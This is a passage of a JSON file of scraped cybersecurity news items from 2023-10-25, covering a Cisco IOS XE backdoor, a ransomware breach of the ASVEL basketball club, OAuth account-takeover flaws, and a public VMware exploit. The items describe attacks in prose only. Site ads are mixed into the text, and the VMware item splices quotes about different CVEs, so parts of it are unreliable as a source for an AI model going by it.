hackers aren’t just succeeding in data theft but are managing to cause unprecedented disruption with their malware.”"
   },
   {
      "time": "2023-10-25",
      "title": "Backdoor Implanted on Hacked Cisco Devices Modified to Evade Detection",
      "text": " The backdoor implanted on Cisco devices by exploiting a pair of zero-day flaws in IOS XE software has been modified by the threat actor so as to escape visibility via previous fingerprinting methods.The exact identity of the threat actor behind the campaign is currently not known, although the number of affected devices is estimated to be in the thousands, based on data shared by VulnCheck and attack surface management company Censys.\"The infections look like mass hacks,\" Mark Ellzey, Senior Security Researcher at Censys, told The Hacker News. \"There may be a time when the hackers go through what they have and figure out if anything is worth anything.\"\"If the request returns a hexadecimal string such as 0123456789abcdef01, the implant is present,\" Cisco noted.\"The addition of the header check in the implant by the attackers is likely a reactive measure to prevent identification of compromised systems,\" the company added. \"This header check is primarily used to thwart compromise identification, [and] likely resulted in a recent sharp decline in visibility of public-facing infected systems.\"Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2023-10-25",
      "title": "ASVEL basketball team confirms data breach after ransomware attack",
      "text": " French professional basketball team LDLC ASVEL (ASVEL) has confirmed that data was stolen after the NoEscape ransomware gang claimed to have attacked the club.ASVEL is a French professional basketball team in Villeurbanne, Lyon, headed by former NBA star Tony Parker. The club is considered the most successful one in the country, having won 21 national championships and 10 cups.ASVEL's says that they were alerted to a potential breach on October 12 via the press, following their addition to NoEscape ransomware's extortion portal on October 9, 2023.The threat actors claimed to have stolen 32 GB of data, including the personal data of players, passports and ID cards, and many documents relating to finance, taxation, and legal matters. NDAs, contracts, confidential letters. Contractual agreements with players are also allegedly included in the stolen data set.The NoEscape ransomware gang is using this stolen data as leverage, threatening to publish it by October 20, 2023, unless ASVEL contacts them to negotiate a ransom payment.ASVEL says they retained cybersecurity specialists who, on October 18, 2023, confirmed that the attackers breached the club's systems and stole data.Although the breach did not impact the club's operations, it is assessing the harm to third parties with data exposed in this incident.One concern is the payment details of those who bought tickets, merchandise, and club membership cards from the official website. As of today, ASVEL says it has no evidence that the attackers have stolen its fans' payment data or bank account details.The incident has been reported to CNIL (Commission Nationale de l'Informatique et des Libertés), France's national data protection authority, and a formal complaint is soon to be submitted to law enforcement authorities.It is worth noting that ASVEL has been removed from NoEscape's darknet portal, and the link to the original entry now returns a 404 error. Also, no data has been leaked.This could indicate that the club is negotiating with the ransomware gang to prevent the leak of data.Believed to be a rebrand of Avaddon, which went defunct in 2021, NoEscape is capable of targeting Windows, Linux, and VMware ESXi servers."
   },
   {
      "time": "2023-10-25",
      "title": "\r\n\tAPI Security Flaw Impacted Grammarly, Vidio and Bukalapak - Infosecurity Magazine\r\n",
      "text": " Freelance JournalistSalt Security has revealed research unveiling critical API security vulnerabilities in the OAuth protocol implementations of popular online platforms like Grammarly, Vidio and Bukalapak. These vulnerabilities, which have now been addressed, had the potential to compromise user credentials and enable full account takeovers, endangering billions of users.These flaws posed severe risks, including providing cyber-criminals unrestricted access to user accounts, potentially resulting in unauthorized access to sensitive financial and personal information. They also exposed users to potential identity theft and financial fraud.OAuth, a widely adopted user authorization and authentication technology, simplifies the sign-in process by allowing users to log in to websites using their social media accounts. The security flaws in these implementations enabled attackers to insert a token from another site as a verified token, a technique referred to as a “Pass-The-Token Attack.”“The thing that stood out most in our research is the fact that OAuth, which is the main technology behind social-login, is actually well designed and contains no obvious fail-points. However, most of the issues we found were related to the way OAuth is implemented by the various parties using it,” explained Yaniv Balmas, vice president of research at Salt Security.“Each one of us logs in to dozens of web services on a daily basis,” Balmas added. “The issues we found affect[ed] more than one billion users who might have found their accounts breached had this issue been found by other, ‘less friendly’ parties.”Image credit: T. Schneider / Shutterstock.com"
   },
   {
      "time": "2023-10-25",
      "title": "VMware warns admins of public exploit for vRealize RCE flaw",
      "text": " VMware warned customers on Monday that proof-of-concept (PoC) exploit code is now available for an authentication bypass flaw in vRealize Log Insight (now known as VMware Aria Operations for Logs).Successful exploitation hinges on the attacker compromising a host within the targeted environment and possessing permissions to add an extra interface or static IP address, according to Horizon3 security researchers who discovered the bug.\"This POC abuses IP address spoofing and various Thrift RPC endpoints to achieve an arbitrary file write,\" the Horizon3 Attack Team said.\"The default configuration of this vulnerability writes a cron job to create a reverse shell. Be sure to change the payload file to suit your environment.\"For this attack to work, an attacker must have the same IP address as a master /worker node.\"The first (CVE-2022-31706) is a directory traversal bug, the second (CVE-2022-31704) is a broken access control flaw, while the third, an information disclosure bug (CVE-2022-31711), allows attackers to gain access to sensitive session and application info,\"This vulnerability is easy to exploit however, it requires the attacker to have some infrastructure setup to serve malicious payloads,\" they said.\"Additionally, since this product is unlikely to be exposed to the internet, the attacker likely has already established a foothold somewhere else on the network.However, threat actors frequently exploit vulnerabilities within previously compromised networks for lateral movement, making vulnerable VMware appliances valuable internal targets."
   }
]